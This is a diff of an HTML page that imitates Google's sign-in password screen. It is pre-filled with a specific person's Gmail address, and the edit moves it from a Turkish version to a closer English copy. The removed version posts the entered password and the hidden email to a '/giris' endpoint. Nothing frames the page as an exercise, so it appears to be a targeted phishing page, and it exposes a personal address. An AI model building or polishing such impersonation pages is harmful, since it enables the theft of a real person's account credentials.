@@ -1,217 +1,264 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Giriş Yap – Google</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-        }
-        body {
-            background: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Giriş Yap - Google Hesapları</title>
+<style>
+    /* Google'ın Kullandığı Font */
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    body {
+        background-color: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 450px;
+        padding: 48px 40px 36px;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        text-align: center;
+        background: #fff;
+        margin: 20px;
+        box-sizing: border-box;
+    }
+
+    .logo {
+        width: 75px;
+        height: 24px; /* Google logosu orantısı */
+        margin-bottom: 10px;
+    }
+
+    .title {
+        padding-bottom: 0;
+        padding-top: 16px;
+        font-size: 24px;
+        font-weight: 400;
+        line-height: 1.3333;
+        margin-bottom: 0;
+        margin-top: 0;
+        color: #202124;
+    }
+
+    .subtitle {
+        padding-bottom: 0;
+        padding-top: 0;
+        font-size: 16px;
+        font-weight: 400;
+        letter-spacing: 0.1px;
+        line-height: 1.5;
+        margin-bottom: 0;
+        margin-top: 0;
+        color: #202124;
+    }
+
+    .profile-area {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 10px;
+        margin-bottom: 25px;
+        gap: 12px;
+    }
+
+    .profile-icon {
+        width: 20px;
+        height: 20px;
+        stroke: #5f6368;
+        fill: none;
+        stroke-width: 2;
+    }
+
+    .email-text {
+        font-size: 14px;
+        font-weight: 500;
+        color: #202124;
+        letter-spacing: 0.25px;
+    }
+
+    .input-group {
+        margin-top: 15px;
+        margin-bottom: 6px;
+        text-align: left;
+    }
+
+    .input-box {
+        width: 100%;
+        height: 56px;
+        padding: 13px 15px;
+        font-size: 16px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        outline: none;
+        background: #fff;
+        color: #202124;
+        transition: border 0.2s;
+    }
+
+    .input-box:focus {
+        border: 2px solid #1a73e8;
+        padding: 12px 14px;
+    }
+
+    .checkbox-area {
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        margin-top: 5px;
+        margin-bottom: 40px;
+    }
+
+    .checkbox-area input {
+        width: 18px;
+        height: 18px;
+        margin-right: 12px;
+        accent-color: #1a73e8;
+    }
+
+    .checkbox-area label {
+        font-size: 14px;
+        color: #202124;
+        font-weight: 400;
+    }
+
+    .button-area {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 20px;
+    }
+
+    .link-btn {
+        background: none;
+        border: none;
+        color: #1a73e8;
+        font-weight: 500;
+        font-size: 14px;
+        cursor: pointer;
+        text-decoration: none;
+        font-family: 'Roboto', Arial, sans-serif;
+    }
+
+    .link-btn:hover {
+        background-color: #f6fafe;
+        border-radius: 4px;
+        padding: 8px 12px;
+        margin: -8px -12px;
+    }
+
+    .btn-next {
+        background-color: #1a73e8;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        padding: 0 24px;
+        height: 36px;
+        font-weight: 500;
+        font-size: 14px;
+        cursor: pointer;
+        font-family: 'Roboto', Arial, sans-serif;
+        letter-spacing: 0.25px;
+    }
+
+    .btn-next:hover {
+        background-color: #1765cc;
+        box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+    }
+
+    /* Alt Kısım Diller (İngilizce versiyon için) */
+    .footer {
+        margin-top: 36px;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+        gap: 8px 16px;
+        font-size: 12px;
+        color: #202124;
+    }
+
+    .footer span {
+        cursor: pointer;
+        color: #1a73e8;
+    }
+
+    .footer span:hover {
+        background-color: #f6fafe;
+        border-radius: 4px;
+        padding: 0 4px;
+    }
+
+    /* Mobil için ayarlar */
+    @media (max-width: 450px) {
         .container {
-            width: 100%;
-            max-width: 390px;
-            padding: 20px;
-        }
-        .card {
-            background: #ffffff;
-            padding: 40px 30px 30px 30px;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            text-align: center;
-        }
-        .google-logo {
-            display: block;
-            margin: 0 auto 16px auto;
-            max-width: 75px;
-            height: auto;
-        }
-        .card h2 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 4px;
-        }
-        .email-display {
-            font-size: 18px;
-            font-weight: 500;
-            color: #202124;
-            padding: 6px 0;
-            margin-bottom: 2px;
-        }
-        .sub {
-            font-size: 16px;
-            font-weight: 400;
-            color: #5f6368;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            text-align: left;
-            margin-bottom: 4px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            background: #fff;
-            color: #202124;
-        }
-        .input-group input:focus {
-            outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
-        }
-        .options-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 12px 0 20px 0;
-            font-size: 14px;
-        }
-        .show-password {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: #3c4043;
-        }
-        .show-password input[type="checkbox"] {
-            width: 16px;
-            height: 16px;
-            accent-color: #1a73e8;
-            cursor: pointer;
-        }
-        .show-password label {
-            cursor: pointer;
-            user-select: none;
-        }
-        .forgot-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-            letter-spacing: 0.3px;
-        }
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-        .next-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 8px;
-        }
-        .create-account {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .create-account:hover {
-            text-decoration: underline;
-        }
-        .btn-next {
-            background: #1a73e8;
-            color: white;
             border: none;
-            padding: 10px 28px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: 0.2s;
-            letter-spacing: 0.5px;
+            padding: 24px;
+            margin: 0;
+            width: 100%;
+            border-radius: 0;
         }
-        .btn-next:hover {
-            background: #1557b0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.15);
-        }
-        .lang {
-            font-size: 13px;
-            color: #5f6368;
-            margin-top: 24px;
-            display: flex;
-            justify-content: center;
-            gap: 14px;
-            flex-wrap: wrap;
-        }
-        .lang a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        .lang a:hover {
-            text-decoration: underline;
-        }
-        .footer-note {
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 16px;
-            text-align: center;
-        }
-    </style>
+    }
+</style>
 </head>
 <body>
+
 <div class="container">
-    <div class="card">
+    <!-- 1. Google Logosu -->
+    <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
 
-        <!-- Google Logosu (resim) -->
-        <img src="google-logo.png" alt="Google" class="google-logo">
+    <!-- 2. Başlıklar -->
+    <h1 class="title">Sign in</h1>
+    <div class="subtitle">to continue to Gmail</div>
 
-        <h2>Hoş geldiniz</h2>
-        <div class="email-display">ramalahmadov53@gmail.com</div>
-        <p class="sub">Şifrenizi girin</p>
-
-        <form action="/giris" method="POST">
-            <input type="hidden" name="email" value="ramalahmadov53@gmail.com">
-
-            <div class="input-group">
-                <input type="password" id="password" name="password" placeholder="Şifrenizi girin" required>
-            </div>
-
-            <div class="options-row">
-                <div class="show-password">
-                    <input type="checkbox" id="showPass" onclick="togglePassword()">
-                    <label for="showPass">Şifreyi göster</label>
-                </div>
-                <a href="#" class="forgot-link">ŞİFRENİZİ Mİ UNUTTUNUZ?</a>
-            </div>
-
-            <div class="next-row">
-                <a href="#" class="create-account">Hesap oluşturun</a>
-                <button type="submit" class="btn-next">SONRAKİ</button>
-            </div>
-        </form>
-
+    <!-- 3. Profil ve Email -->
+    <div class="profile-area">
+        <svg class="profile-icon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+            <circle cx="12" cy="7" r="4"></circle>
+        </svg>
+        <span class="email-text">ramalahmadov53@gmail.com</span>
     </div>
 
-    <div class="lang">
-        <a href="#">Türkçe</a>
-        <a href="#">English (UK)</a>
-        <a href="#">اردو</a>
-        <a href="#">العربية</a>
-        <a href="#">فارسی</a>
+    <!-- 4. Şifre Kutusu -->
+    <div class="input-group">
+        <input class="input-box" type="password" placeholder="Enter your password">
     </div>
-    <div class="footer-note">Tek bir hesap. Google'ın tüm hizmetleri sizin için.</div>
+
+    <!-- 5. Şifreyi Göster Checkbox -->
+    <div class="checkbox-area">
+        <input type="checkbox" id="showPass">
+        <label for="showPass">Show password</label>
+    </div>
+
+    <!-- 6. Alt Butonlar -->
+    <div class="button-area">
+        <button class="link-btn">Forgot password?</button>
+        <button class="btn-next">Next</button>
+    </div>
+
+    <!-- 7. Alt Kısım Diller (İngilizce) -->
+    <div class="footer">
+        <span>English (United States)</span>
+        <span>español</span>
+        <span>português (Brasil)</span>
+        <span>français</span>
+        <span>हिन्दी</span>
+        <span style="color:#202124;">▼</span>
+    </div>
 </div>
 
-<script>
-    function togglePassword() {
-        const input = document.getElementById('password');
-        const check = document.getElementById('showPass');
-        input.type = check.checked ? 'text' : 'password';
-    }
-</script>
 </body>
     </html>
